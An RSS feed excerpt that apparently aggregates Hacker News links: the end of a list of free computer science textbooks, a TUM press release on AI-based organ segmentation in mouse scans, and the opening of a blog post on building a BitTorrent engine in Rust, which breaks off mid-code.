  <li><a href="http://www.usingz.com/">Using Z: Specification, Refinement, and Proof</a></li>
  <li><a href="http://homotopytypetheory.org/book/">Homotopy Type Theory</a></li>
  <li><a href="http://www.itu.dk/~sestoft/pebook/">Partial Evaluation and Automatic Program Generation</a></li>
  <li><a href="http://www.nuprl.org/book/">Implementing Mathematics with The Nuprl Proof Development System</a></li>
  <li><a href="http://intuitionistic.files.wordpress.com/2010/07/martin-lof-tt.pdf">Intuitionistic Type Theory</a></li>
  <li><a href="http://www21.in.tum.de/~nipkow/Concrete-Semantics">Concrete Semantics</a></li>
  <li><a href="http://www602.math.ryukoku.ac.jp/~nakano/papers/index.html">PX: A Comuptational Logic</a></li>
  <li><a href="http://research.microsoft.com/en-us/um/people/lamport/tla/book.html">Specifying Systems: The TLA+ Language and Tools for Hardware and Software Engineers</a></li>
  <li>*<a href="http://cristal.inria.fr/attapl/">The Essence of ML Type Inference</a> 
  (Manuscript, Chapter 10 of <a href="http://www.cis.upenn.edu/~bcpierce/attapl/index.html">ATTAPL</a>)</li>
  <li><a href="http://cs.au.dk/~amoeller/spa/">Static Program Analysis</a></li>
  <li><a href="http://pl.cs.jhu.edu/pl/book/index.shtml">Principles of Programming Languages</a></li>
  <li><a href="https://manu.sridharan.net/files/aliasAnalysisChapter.pdf">Alias Analysis for Object-Oriented Programs”</a> 
  (Manuscript, chapter of <emph>Aliasing in Object-Oriented Programming</emph>)</li>
  <li><a href="https://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a></li>
  <li><a href="http://tata.gforge.inria.fr/">Tree Automata Techniques and Applications</a></li>
  <li><a href="http://www.wisdom.weizmann.ac.il/~harel/reactive_systems.html">Modeling Reactive Systems with Statecharts: The STATEMATE Approach</a></li>
  <li>*<a href="https://www.cs.princeton.edu/~appel/papers/plcc.pdf">Program Logics for Certified Compilers</a></li>
  <li><a href="http://www.lix.polytechnique.fr/Labo/Samuel.Mimram/teaching/INF551/course.pdf">Program = Proof</a></li>
  <li><a href="https://www.cambridge.org/core/books/foundations-of-probabilistic-programming/819623B1B5B33836476618AC0621F0EE">Foundations of Probabilistic Programming</a></li>
</ul>

<h2 id="mathematical-logic-set-theory-model-theory-topology">Mathematical Logic, Set Theory, Model Theory, Topology</h2>

<p>This portion excludes category theory, which is now its own section below.</p>

<ul>
  <li><a href="http://tellerprimer.ucdavis.edu/">A Modern Formal Logic Primer</a></li>
  <li><a href="http://people.cohums.ohio-state.edu/tennant9/Natural_Logic.pdf">Natural Logic</a> (pdf)</li>
  <li><a href="http://www.math.cornell.edu/~hatcher/AT/ATpage.html">Algebraic Topology</a></li>
  <li><a href="http://www.math.uchicago.edu/~may/BOOKSMaster.html">A Concise Course in Algebraic Topology</a></li>
  <li><a href="http://www.math.toronto.edu/weiss/model_theory.html">Model Theory</a></li>
  <li><a href="http://www.math.toronto.edu/weiss/set_theory.html">Set Theory</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.183.8564">An Introduction to Substructural Logics</a></li>
  <li><a href="http://homepages.mcs.vuw.ac.nz/~rob/papers/modalhist.pdf">Mathematical Modal Logic: A View of its Evolution</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1705616123X">Normalization, Cut-Elimination, and the Theory of Proofs</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1111907143">Logics of Time and Computation</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1114665926">Mathematics of Modality</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1766806333X">Modal Logic and Process Algebra: A Bisimulation Perspective</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1791546586X">Lectures on Linear Logic</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1710712960X">Dynamics, Polarity, and Quantification</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1821513720X">Non-Well-Founded Sets</a></li>
  <li><a href="http://www.logicinaction.org/">Logic in Action</a></li>
  <li><a href="http://www1.chapman.edu/~jipsen/JipsenRoseVoL.html">Varieties of Lattices</a></li>
  <li><a href="http://wwwhomes.uni-bielefeld.de/mkracht/html/tools/index.html">Tools and Techniques in Modal Logic</a> (the page is in German; the download link is the actual PDF)</li>
  <li>*<a href="https://math.berkeley.edu/~gbergman/245/">An Invitation to General Algebra and Universal Constructions</a></li>
  <li><a href="https://www.math.uchicago.edu/~may/BOOKSMaster.html">A Concise Course in Algebraic Topology</a> (near the bottom)</li>
  <li><a href="https://library.oapen.org/handle/20.500.12657/35301">Logic and Automata: History and Perspectives</a></li>
  <li><a href="https://topology.pubpub.org/">Topology: A Categorical Approach</a></li>
</ul>

<h2 id="software-engineering-theory-and-practice">Software Engineering (Theory and Practice)</h2>

<ul>
  <li><a href="https://landing.google.com/sre/sre-book/toc/index.html">Site Reliability Engineering</a></li>
  <li><a href="https://landing.google.com/sre/workbook/toc/">The Site Reliability Workbook</a></li>
  <li>The Architecture of Open Source Applications project books:
    <ul>
      <li><a href="https://www.aosabook.org/en/index.html">The Architecture of Open Source Applications</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">The Architecture of Open Source Applications, Vol. 2</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">The Performance of Open Source Applications</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">500 Lines or Less</a></li>
    </ul>
  </li>
  <li><a href="https://sttp.site/">Software Testing: From Theory to Practice</a> (NOTE: Often does not load for me)</li>
</ul>

<h2 id="category-theory-and-applications">Category Theory and Applications</h2>

<ul>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/17/tr17abs.html">Abstract and Concrete Categories: The Joy of Cats</a></li>
  <li><a href="http://www.cs.man.ac.uk/~david/categories/">Computational Category Theory</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/12/tr12abs.html">Toposes, Triples, and Theories</a></li>
  <li>*<a href="http://ebooks.library.cornell.edu/cgi/t/text/text-idx?c=math;idno=gold010">Topoi: The Categorical Analysis of Logic</a>
  (<a href="http://projecteuclid.org/euclid.bia/1403013939#toc">also at Project Euclid</a>)</li>
  <li><a href="http://www.di.ens.fr/users/longo/download.html">Categories, Types, and Structures</a></li>
  <li><a href="http://arxiv.org/abs/math/0305049/">Higher Operads, Higher Categories</a></li>
  <li><a href="ftp://ftp.math.mcgill.ca/barr/pdffiles/ctcs.pdf">Category Theory for Computing Science</a> [pdf]
  (<a href="ftp://ftp.math.mcgill.ca/barr/pdffiles/Index.html">Barr’s publications</a>)</li>
  <li><a href="http://www.math.mcgill.ca/barr/papers/sac.pdf">*-Autonomous Categories</a></li>
  <li><a href="http://www.cl.cam.ac.uk/~amp12/papers/catl/catl.pdf">Categorical Logic</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/3/tr3abs.html">Abelian Categories</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/1/tr1abs.html">Metric Spaces, Generalized Logic, and Closed Categories</a></li>
  <li><a href="http://www.lfcs.inf.ed.ac.uk/reports/92/ECS-LFCS-92-208/">An introduction to fibrations, topos theory, the effective topos and modest sets</a></li>
  <li><a href="http://www.math.harvard.edu/~eriehl/cathtpy.pdf">Categorical Homotopy Theory</a></li>
  <li><a href="http://arxiv.org/abs/1302.6946">Category Theory for Scientists</a> (Manuscript)</li>
  <li><a href="http://projecteuclid.org/euclid.bams/1183526392">Categorical Algebra</a> (technically a 1965 journal article from Bull. Amer. Math. Soc., 17(1):40–106, but up on Project Euclid.</li>
  <li>Higher Topos Theory: <a href="http://math.harvard.edu/~lurie/papers/croppedtopoi.pdf">Author version</a>,
  <a href="http://arxiv.org/abs/math/0608040">arXiv version</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/10/tr10abs.html">Basic Concepts of Enriched Category Theory</a></li>
  <li>The online journal Theory and Applications of Categories archives electronic versions of some out of print category theory textbooks:  <a href="http://www.tac.mta.ca/tac/reprints/index.html">Reprints in Theory and Applications of Categories</a></li>
  <li><a href="https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/">Category Theory for Programmers</a></li>
  <li><a href="http://www.mathematik.uni-regensburg.de/cisinski/CatLR.pdf">Higher Categories and Homotopical Algebra</a> author preprint</li>
  <li><a href="http://www.math.mcgill.ca/barr/papers/sac.pdf">*-Autonomous Categories</a></li>
  <li><a href="https://arxiv.org/abs/2002.06055">2-Dimensional Categories</a></li>
  <li><a href="https://reyes-reyes.com/2018/04/02/first-order-categorical-logic-2/">First-Order Categorical Logic</a></li>
  <li><a href="https://reyes-reyes.com/2004/06/01/generic-figures-and-their-glueings-a-constructive-approach-to-functor-categories/">Generic Figures and Their Glueings: A Constructive Approach to Functor Categories</a></li>
  <li><a href="http://www.math.jhu.edu/~eriehl/context.pdf">Category Theory in Context</a></li>
</ul>

<h2 id="language-implementation">Language Implementation</h2>

<ul>
  <li><a href="http://research.microsoft.com/en-us/um/people/simonpj/Papers/pj-lester-book/">Implementing Functional Languages: A Tutorial</a></li>
  <li><a href="http://research.microsoft.com/en-us/um/people/simonpj/papers/slpj-book-1987/">The Implementation of Functional Programming Languages</a></li>
  <li><a href="http://callvirt.net/blog/files/Shared%20Source%20CLI%202.0%20Internals.pdf">Shared Source CLI 2.0 Internals</a> 
  (<a href="http://callvirt.net/blog/post/SSCLI-20-Patch-for-VS-2010.aspx">shelved draft</a>)</li>
  <li><a href="http://wiki.squeak.org/squeak/64">Smalltalk-80: The Language and its Implementation</a> (a.k.a. “The Blue Book”)</li>
  <li><a href="http://dippl.org/">The Design and Implementation of Probabilistic Programming Languages</a></li>
</ul>

<h2 id="systems--networking-including-security-architecture">Systems &amp; Networking (including Security, Architecture)</h2>

<ul>
  <li>*<a href="https://www.aosabook.org/en/index.html">A Commentary on the Sixth Edition UNIX Operating System</a> (and <a href="http://v6.cuzuco.com/">UNIX v6 source code</a>)</li>
  <li><a href="https://www.distributed-systems.net/index.php/books/distributed-systems-3rd-edition-2017/">Distributed Systems, 3rd Edition</a> by van Steen and Tanenbaum</li>
  <li><a href="http://www.iecc.com/linker/">Linkers and Loaders</a></li>
  <li><a href="http://research.microsoft.com/en-us/people/philbe/ccontrol.aspx">Concurrency Control and Recovery in Database Systems</a></li>
  <li><a href="https://www.kernel.org/pub/linux/kernel/people/paulmck/perfbook/perfbook.html">Is Parallel Programming Hard, And, If So, What Can You Do About It?</a></li>
  <li><a href="http://pages.cs.wisc.edu/~remzi/OSTEP/">Operating Systems: Three Easy Pieces</a></li>
  <li><a href="http://www.tcpipguide.com/">The TCP/IP Guide</a></li>
  <li><a href="http://cs-www.cs.yale.edu/homes/aspnes/classes/465/notes.pdf">Notes on Theory of Distributed Systems, CPSC 465/565</a> (technically notes, but in practice an excellent textbook)</li>
  <li>*<a href="http://www.nobius.org/~dbg/practical-file-system-design.pdf">Practical File System Design with the Be File System</a></li>
  <li><a href="http://ocw.mit.edu/resources/res-6-004-principles-of-computer-system-design-an-introduction-spring-2009/online-textbook/">Principles of Computer System Design</a> (Authors share second half online, first half published in print by Elsevier)</li>
  <li><a href="http://webdam.inria.fr/Alice/">Foundations of Databases</a></li>
  <li><a href="http://www.cl.cam.ac.uk/~rja14/book.html">Security Engineering: A Guide to Building Dependable Distributed Systems</a></li>
  <li><a href="http://cnp3book.info.ucl.ac.be/">Computer Networking</a></li>
  <li><a href="http://www.sigcomm.org/content/ebook">Recent Advances in Networking, Volume 1</a></li>
  <li><a href="http://perfeval.epfl.ch/index.htm">Performance Evaluation Of Computer And Communication Systems</a></li>
  <li><a href="http://ica1www.epfl.ch/PS_files/NetCal.htm">The Network Calculus Book</a></li>
  <li>*<a href="https://www.systemsapproach.org/book.html">Computer Networking: A Systems Approach</a></li>
  <li><a href="https://nebelwelt.net/SS3P/">Software Security: Principles, Policies, and Protection</a></li>
  <li><a href="http://ecee.colorado.edu/~bart/book/book/index.html">Principles of Electronic Devices</a></li>
  <li><a href="https://www.netbsd.org/docs/internals/en/index.html">NetBSD Internals</a></li>
  <li><a href="https://www.cl.cam.ac.uk/~jac22/otalks/ods.pdf">Open Distributed Systems</a></li>
  <li><a href="https://www.distributedconsensus.net/">Foundations of Distributed Consensus and Blockchains</a></li>
</ul>

<h2 id="general-cs-theory-and-algorithms-including-ai-ml-data-science">General CS Theory and Algorithms (including AI, ML, Data Science…)</h2>

<ul>
  <li><a href="http://infolab.stanford.edu/~ullman/focs.html">Foundations of Computer Science</a></li>
  <li><a href="http://www.princeton.edu/~rvdb/LPbook/">Linear Programming: Foundations and Extensions</a></li>
  <li><a href="http://www.designofapproxalgs.com/">The Design of Approximation Algorithms</a></li>
  <li><a href="http://www.mmds.org/">Mining of Massive Datasets</a></li>
  <li><a href="http://mbmlbook.com/">Model-Based Machine Learning</a></li>
  <li><a href="https://www.microsoft.com/en-us/research/publication/foundations-of-data-science/">Foundations of Data Science</a></li>
  <li><a href="http://greenteapress.com/wp/think-data-structures/">Think Data Structures</a></li>
  <li><a href="http://greenteapress.com/wp/think-bayes/">Think Bayes: Bayesian Statistics Made Simple</a></li>
  <li><a href="https://greenteapress.com/wp/think-stats-2e/">Think Stats</a></li>
  <li><a href="https://www.cambridge.org/us/academic/subjects/computer-science/algorithmics-complexity-computer-algebra-and-computational-g/algorithmic-game-theory">Algorithmic Game Theory</a>
    <ul>
      <li>This one’s a bit awkward to find: Click on the “Resources” tab (right of Description and
  Contents), and in the resulting “General Resources” side-bar that appears to the left, click
  on the book title.  In the table that appears, click where the book title appears under the
  “Name” column; this is the full PDF of the book.</li>
    </ul>
  </li>
  <li><a href="https://muse.jhu.edu/book/60836">Reinforcement Learning: An Introduction</a> (also, direct PDF of
  author preprint of 2nd edition <a href="http://incompleteideas.net/book/bookdraft2018mar21.pdf">here</a>)</li>
  <li><a href="http://incompleteideas.net/book/the-book-2nd.html">Reinforcement Learning: An Introduction, 2nd Edition</a></li>
  <li><a href="https://muse.jhu.edu/book/60833">Machine Learning for Data Streams: with Practical Examples in MOA</a></li>
  <li><a href="https://fairmlbook.org/">Fairness and Machine Learning</a></li>
  <li><a href="http://www.deeplearningbook.org/">Deep Learning</a></li>
  <li><a href="http://www.algorithmsilluminated.org/">Algorithms Illuminated</a></li>
  <li><a href="https://seeing-theory.brown.edu/index.html">Seeing Theory: A Visual Introduction to Probability and Statistics</a></li>
  <li><a href="https://mml-book.github.io/">Mathematics for Machine Learning</a></li>
  <li><a href="https://web.engr.oregonstate.edu/~rosulekm/crypto/">The Joy of Cryptography</a></li>
  <li><a href="http://people.cs.bris.ac.uk/~nigel/Crypto_Book/">Cryptography, An Introduction</a></li>
  <li><a href="https://toc.cryptobook.us/">A Graduate Course in Applied Cryptography</a></li>
  <li><a href="http://neuralnetworksanddeeplearning.com/">Neural Networks and Deep Learning</a></li>
  <li><a href="https://qiskit.org/textbook/preface.html">Learn Quantum Computing using Qiskit</a></li>
  <li><a href="http://masfoundations.org/download.html">Multiagent Systems: Algorithmic, Game-Theoretic, and Logical Foundations</a></li>
  <li><a href="http://d2l.ai/">Dive into Deep Learning</a></li>
  <li><a href="http://discrete.openmathbooks.org/dmoi3.html">Discrete Mathematics: An Open Introduction, 3rd Edition</a></li>
  <li><a href="http://cs.brown.edu/people/jsavage/book/">Models Of Computation</a></li>
  <li><a href="http://diestel-graph-theory.com/index.html">Graph Theory</a></li>
  <li>*<a href="http://theory.cs.princeton.edu/complexity/">Computational Complexity: A Modern Approach (draft)</a></li>
  <li><a href="https://www.cis.upenn.edu/~aaroth/privacybook.html">The Algorithmic Foundations of Differential Privacy</a></li>
</ul>



<ul>
  <li><a href="http://vmls-book.stanford.edu/">Introduction to Applied Linear Algebra: Vectors, Matrices, and Least Squares</a></li>
  <li><a href="https://www.hsph.harvard.edu/miguel-hernan/causal-inference-book/">The Causal Inference Book</a></li>
  <li><a href="http://faculty.marshall.usc.edu/gareth-james/ISL/">An Introduction to Statistical Learning, with Applications in R</a></li>
  <li><a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning: Data Mining, Inference, and Prediction</a></li>
  <li><a href="http://linear.axler.net/">Linear Algebra Abridged</a> (Linear Algebra Done Right, minus proofs)</li>
  <li><a href="http://statsthinking21.org/index.html">Statistical Thinking for the 21st Century</a></li>
  <li><a href="http://web.stanford.edu/~boyd/cvxbook/">Convex Optimization</a></li>
  <li><a href="https://archive.org/details/AnIntroductionToProbabilityTheoryAndItsApplicationsVolume1">An Introduction to Probability Theory and its Applications</a></li>
  <li>[Numerical Linear Algebra] (https://people.maths.ox.ac.uk/trefethen/text.html)</li>
</ul>

<h2 id="computational-linguistics--natural-language-processing">Computational Linguistics &amp; Natural Language Processing</h2>

<ul>
  <li><a href="https://linguistics.ucla.edu/people/Kracht/courses/compling2-2007/formal.pdf">The Mathematics of Language</a> (<a href="https://linguistics.ucla.edu/people/Kracht/courses/compling2-2007/cl2007.html">via author’s homepage</a>)</li>
  <li><a href="https://www.fulcrum.org/concern/monographs/6h440s98b">The Syntactic Process</a></li>
  <li><a href="https://web.stanford.edu/~jurafsky/slp3/">Speech and Language Processing</a></li>
  <li><a href="https://github.com/jacobeisenstein/gt-nlp-class/tree/master/notes">Natural Language Processing</a></li>
  <li><a href="https://www.tidytextmining.com/">Text Mining with R</a></li>
  <li><a href="http://www.nltk.org/book/">Natural Language Processing with Python: Analyzing Text with the Natural Language Toolkit (NLTK)</a></li>
</ul>

<h2 id="education">Education</h2>

<ul>
  <li><a href="http://grid.cs.gsu.edu/~tcpp/curriculum/?q=cedr_book">Topics in Parallel and Distributed Computing: Introducing Concurrency in Undergraduate Courses</a> (preprint)</li>
</ul>

<h2 id="language-focused-introductions-to-computer-science">Language-Focused Introductions to Computer Science</h2>

<ul>
  <li><a href="http://mitpress.mit.edu/sicp/full-text/book/book.html">Structure and Interpretation of Computer Programs</a>
  (also: <a href="http://sicpebook.wordpress.com/ebook/">Unofficial PDF Ebook Reformatting</a>,
  and <a href="http://sicpinclojure.com/">SICP in Clojure</a>)</li>
  <li><a href="http://www.ccs.neu.edu/home/matthias/htdc.html">How to Design Classes (draft)</a></li>
  <li><a href="https://htdp.org/2018-01-06/">How to Design Programs (2nd Edition)</a></li>
  <li><a href="https://htdp.org/2003-09-26/">How to Design Programs (1st Edition)</a></li>
</ul>

<h2 id="specific-programming-languages">Specific Programming Languages</h2>

<p>While most of the books on this page are focused on more theoretical/foundational topics, sometimes you just need
to learn a programming language or look at some reference on a particular language feature.</p>
</div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://csgordon.github.io/books.html">https://csgordon.github.io/books.html</a></em></p>]]>
            </description>
            <link>https://csgordon.github.io/books.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572852</guid>
            <pubDate>Tue, 29 Dec 2020 18:14:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self-learning algorithms analyze medical imaging data]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25572558">thread link</a>) | @gmays
<br/>
December 29, 2020 | https://www.tum.de/nc/en/about-tum/news/press-releases/details/36399/ | <a href="https://web.archive.org/web/*/https://www.tum.de/nc/en/about-tum/news/press-releases/details/36399/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><img title="Segmentation" alt="Thanks to artificial intelligence, the AIMOS software is able to recognize bones and organs on three-dimensional grayscale images and segments them, which makes the subsequent evaluation considerably easier. " src="https://www.tum.de/fileadmin/_processed_/a/a/csm_201123_Oliver_Schoppe_AE_183_2100_c1de664141.jpg" width="1280" height="540"><figcaption>
				
					Thanks to artificial intelligence, the AIMOS software is able to recognize bones and organs on three-dimensional grayscale images and segments them, which makes the subsequent evaluation considerably easier. 
				
				<p><span>
					
						Image: Astrid Eckert / TUM
					
				</span></p></figcaption></div><div><div><article itemscope="itemscope" itemtype="http://schema.org/Article"><header><p itemprop="description">
					Imaging techniques enable a detailed look inside an organism. But interpreting the data is time-consuming and requires a great deal of experience. Artificial neural networks open up new possibilities: They require just seconds to interpret whole-body scans of mice and to segment and depict the organs in colors, instead of in various shades of gray. This facilitates the analysis considerably.

				</p></header><section><p>How big is the liver? Does it change if medication is taken? Is the kidney inflamed? Is there a tumor in the brain and did metastases already develop? In order to answer such questions, bioscientists and doctors to date had to screen and interpret a wealth of data.</p><p>"The analysis of three-dimensional imaging processes is very complicated," explains Oliver Schoppe. Together with an interdisciplinary research team, the TUM researcher has now developed self-learning algorithms to in future help analyze bioscientific image data.</p><p>At the core of the AIMOS software – the abbreviation stands for AI-based Mouse Organ Segmentation – are artificial neural networks that, like the human brain, are capable of learning. "You used to have to tell computer programs exactly what you wanted them to do," says Schoppe. "Neural networks don't need such instructions:" It's sufficient to train them by presenting a problem and a solution multiple times. Gradually, the algorithms start to recognize the relevant patterns and are able to find the right solutions themselves."</p><div id="c61471"><div><div><p>In the AIMOS project, the algorithms were trained with the help of images of mice. The objective was to assign the image points from the 3D whole-body scan to specific organs, such as stomach, kidneys, liver, spleen, or brain. Based on this assignment, the program can then show the exact position and shape.</p><p>"We were lucky enough to have access to several hundred image of mice from a different research project, all of which had already been interpreted by two biologists," recalls Schoppe. The team also had access to fluorescence microscopic 3D scans from the Institute for Tissue Engineering and Regenerative Medicine at the Helmholtz Zentrum München.</p><p>Through a special technique, the researchers were able to completely remove the dye from mice that were already deceased. The transparent bodies could be imaged with a microscope step by step and layer for layer. The distances between the measuring points were only six micrometers – which is equivalent to the size of a cell. Biologists had also localized the organs in these datasets.</p></div></div></div><div id="c61472"><div><div><p>At the TranslaTUM the information techs presented the data to their new algorithms. And these learned faster than expected, Schoppe reports: "We only needed around ten whole-body scans before the software was able to successfully analyze the image data on its own – and within a matter of seconds. It takes a human hours to do this."</p><p>The team then checked the reliability of the artificial intelligence with the help of 200 further whole-body scans of mice. "The result shows that self-learning algorithms are not only faster at analyzing biological image data than humans, but also more accurate," sums up Professor Bjoern Menze, head of the Image-Based Biomedical Modeling group at TranslaTUM at the Technical University of Munich.</p><p>The intelligent software is to be used in the future in particular in basic research: "Images of mice are vital for, for example, investigating the effects of new medication before they are given to humans. Using self-learning algorithms to analyze image data in the future will save a lot of time in the future," emphasizes Menze.</p></div></div></div><div><h3>
			Publications:
		</h3><p>Oliver Schoppe, Chenchen Pan, Javier Coronel, Hongcheng Mai, Zhouyi Rong, Mihail Ivilinov Todorov, Annemarie Müskes, Fernando Navarro, Hongwei Li, Ali Ertürk, Bjoern H. Menze<br> Deep learning-enabled multi-organ segmentation in whole-body mouse scans<br> nature communications, 6.11.2020 – DOI: <a href="https://www.nature.com/articles/s41467-020-19449-7#Abs1" title="Link zur Originalpublikation" target="_blank">10.1038/s41467-020-19449-7</a></p></div><div><h3>
			More information:
		</h3><div><p>The research was conducted at <a href="https://www.translatum.tum.de/en/" title="Link to TranslaTUM website" target="_blank">TranslaTUM</a>, the Center for Translational Cancer Research, at the Technical University of Munich. The institute is part of the <a href="https://www.med.tum.de/en" title="Link to TUM School of Medicine" target="_blank">TUM University Hospital rechts der Isar</a> and specializes in transferring cancer research insights to practical patient services through interdisciplinary cooperation. When using the novel 3D microscopy, the scientists at the TUM worked closely with experts at the Helmholtz Zentrum München.</p><p>The research project was funded by the German Federal Ministry of Education and Research (BMBF) within the scope of the Software Campus Initiative, the Deutsche Forschungsgemeinschaft (DFG) via the cluster of excellence <a href="https://www.synergy-munich.de/" title="Link to cluster of excellence SyNergy" target="_blank">Munich Cluster for Systems Neurology (SyNergy)</a>, as well as a research grant and by the <a href="https://www.ias.tum.de/" title="Link to TUM Institute for Advanced Study" target="_blank">TUM Institute for Advanced Study</a> funded by the German excellence initiative and the European Union. The research was also funded by the Fritz Thyssen Foundation. NVIDIA supported the work of the GPU Grant Program.</p></div></div><div><div><div><h3>
		Corporate Communications Center
	</h3></div></div></div><section></section></section></article></div></div></div>]]>
            </description>
            <link>https://www.tum.de/nc/en/about-tum/news/press-releases/details/36399/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572558</guid>
            <pubDate>Tue, 29 Dec 2020 17:55:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a BitTorrent engine in Rust]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25572039">thread link</a>) | @mandreyel
<br/>
December 29, 2020 | https://mandreyel.github.io/posts/rust-bittorrent-engine/ | <a href="https://web.archive.org/web/*/https://mandreyel.github.io/posts/rust-bittorrent-engine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>This post recounts the journey of writing
<a href="https://github.com/mandreyel/cratetorrent">cratetorrent</a>, interesting
optimizations, and some of the insights gained.</p>
<h2 id="prologue">Prologue</h2>
<p>Growing up, torrenting was a big thing around me. I was always curious how it
worked.</p>
<p>This curiosity only grew after I had gotten into programming and understood more
details. There is a piece of technology that is so effective yet simple, that,
without any marketing, it gained widespread adoption due to sheer technical
superiority. It just worked and people used it.</p>
<p>So why not write one? I tried, in C++. It was never finished and it’s probably
better that way. Let’s forget it.</p>
<p>Fast-forward a few years. I got into Rust and needed a familiar playground to
practice the language. I did what anyone in such a situation would do: I wrote
another torrent engine. It’s torrent engines all the way back.</p>
<p>Thus was cratetorrent born. The name is a wordplay on the C++
<a href="https://github.com/arvidn/libtorrent"><code>libtorrent</code> library</a>. Its code and
blog were highly educational during my first attempt. This is my thanks.</p>
<h2 id="torrent-101">Torrent 101</h2>
<p>So how <em>do</em> torrents work?</p>
<p>A brief overview of the BitTorrent V1
protocol follows. For those familiar, feel free to skip to the <a href="#key-optimizations">next
section</a>.</p>
<h3 id="what-is-it">What is it?</h3>
<p>BitTorrent is a <em>mostly</em> decentralized file-sharing protocol: it consists of
potentially many symmetrical clients exchanging arbitrary data.</p>
<p>Its advantage over downloading from a single host is that the load is
distributed among all participants in the torrent, thereby increasing
availability, scalability, and often download speed, too.</p>
<p>It used to be highly popular, as everyone used it to share…Linux distros, yes,
and other <em>definitely legal content</em>. Nowadays it’s still in use, but its
use cases are more subtle: e.g. Windows 10 uses BitTorrent, or something like
it, to <a href="https://lifehacker.com/windows-10-uses-your-bandwidth-to-distribute-updates-d-1721091469">distribute
updates</a>
among its users.</p>
<h3 id="whos-in-a-torrent">Who’s in a torrent?</h3>
<p>The first actor on the stage is the torrent <em>metainfo</em> file. It contains basic
metadata about the torrent, most importantly its name, its files with their
paths and lengths, and its <em>trackers</em>. These files are usually hosted by
torrenting sites and this is what you download when starting a torrent.</p>
<p>So what are these trackers? While the download of the content itself is fully
decentralized, a client needs to know which other clients it can download from.
Such other clients in the torrent’s <em>swarm</em> are called <em>peers</em>. Peers that have
all the data are <em>seeds</em>, the rest are <em>leeches</em>. A bit of an uncomfortable
term.</p>
<p>Therefore at the beginning of a download a client asks trackers about
peers. Trackers are the only centralized part of the protocol.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> Once done,
the client connects these peers and begins downloading data.</p>
<h3 id="data-representation">Data representation</h3>
<p>A torrent may have one or more files but from the point of view of the wire
protocol they are all just one big contiguous sequence of bytes.</p>
<p>This byte sequence is cut up into equal sized <em>pieces</em>, which are further cut up
into 16 KiB <em>blocks</em>. Peers exchange these blocks of data and use them to
reassemble the torrent’s files.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>A peer can only share the complete pieces it has. However, breaking up a piece
into blocks enables downloading it from multiple peers, potentially
completing it sooner. Once complete, the peer can immediately share it with
other peers, even if it does not have all pieces itself. This increases
availability, a key feature of the protocol.</p>
<p>A tricky part here is that files are not padded to align with piece boundaries.</p>
<figure>
  <img src="https://mandreyel.github.io/images/cratetorrent-data-repr.svg" alt="data representation">
</figure>



<p>This has two consequences:</p>
<ul>
<li>the last piece may be smaller than the rest,</li>
<li>and pieces may not align with file boundaries, both shown above.</li>
</ul>
<p>Therefore when writing blocks to disk, they may have to be split across several
files. The logic can get quite gnarly here if done optimally.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p>
<h3 id="the-peer-protocol">The peer protocol</h3>
<ul>
<li>After the client connected the peer via TCP, they exchange handshakes.</li>
<li>One or both tells the other that it can start requesting blocks.</li>
<li>The client then requests a block from a piece it chose<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>, its peer sends it,
and the client saves it.</li>
<li>Repeat until finished.</li>
</ul>
<p>That’s about it, but perhaps surprising no one, a real world implementation will
be quite a bit more complex. Let’s see some of the complications.</p>
<h2 id="key-optimizations">Key optimizations</h2>
<p>(But nothing premature, promise!)</p>
<h3 id="download-pipelining">Download pipelining</h3>
<p>A naive implementation might do what was outlined above: send requests
sequentially, one after the previous request was served. The problem with it is
that it doesn’t utilize the connection’s capacity.</p>
<p>To do so, we try to estimate a connection’s <a href="https://en.wikipedia.org/wiki/Bandwidth-delay_product">bandwidth-delay
product</a> for each peer
that the client is downloading from. This is the maximum amount of data that can
be on the link at any given time–that is, the sent but not yet received bytes.</p>
<p>So to get the best performance we keep as many requests outstanding as would
fill the link’s capacity.</p>
<p>A picture makes this explanation a lot more pleasant:</p>
<figure>
  <img src="https://mandreyel.github.io/images/cratetorrent-request-pipeline.svg" alt="download pipelining benefits">
</figure>



<p>It’s clearly visible that in the same amount of time, a lot more requests could
be fulfilled. This is the number one most important optimization, strongly
recommended by the spec itself.</p>
<p>Cratetorrent uses a running average for the download rate and a simplified model
of the BDP, by assuming the latency to be a constant 1 second, to get the
request queue size:</p>
<div><pre><code data-lang="rust"><span>let</span> request_queue_size <span>=</span> download_rate <span>/</span> BLOCK_LEN;
